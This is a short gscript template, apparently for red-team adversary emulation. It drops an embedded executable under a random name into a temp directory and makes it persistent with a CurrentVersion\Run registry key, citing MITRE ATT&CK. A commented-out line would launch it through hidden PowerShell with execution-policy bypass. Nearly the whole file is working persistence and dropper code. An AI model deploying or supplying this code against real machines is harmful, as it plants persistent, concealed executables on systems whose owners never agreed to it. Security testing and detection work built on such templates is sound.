// Example gscript template
// Title: CurrentVersion Run Persistence
// Author: ahhh
// Purpose: Drop a sample binary and persist it using a CurrentVersion\Run regkey
// Gscript version: 0.1.1
// ATT&CK: https://attack.mitre.org/wiki/Technique/T1112

//priority:90
//timeout:150
//import:/private/tmp/example.exe

var fn;

function BeforeDeploy() {
  LogInfo("starting execution of Run Key Persistence");
  return true; 
}

function Deploy() {
  // Drop the sample
  var example = Asset("example.exe");
  var name = "";
  var possible = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
  for (var i = 0; i < 5; i++)
    name += possible.charAt(Math.floor(Math.random() * possible.length));
  name = name+".exe";
  var path = WriteTempFile(name, example.fileData);
  LogInfo("dropped the example binary here: "+path.fullpath);
  
  // Persist the sample
  AddRegKeyString("CURRENT_USER", "Software\\Microsoft\\Windows\\CurrentVersion\\Run", "ExampleExe", path.fullpath);
  console.log("Adding a reg key for current user run");

  // Execute the sample
  //ForkExecuteCommand("powershell", ["-NoLogo", "-WindowStyle", "hidden", "-ep", "bypass", path.fullpath]);
  //LogInfo("executed the example binary");
  return true;
}

function AfterDeploy() {
  LogInfo("done, deployed binary with run key persistence");
  return true;
}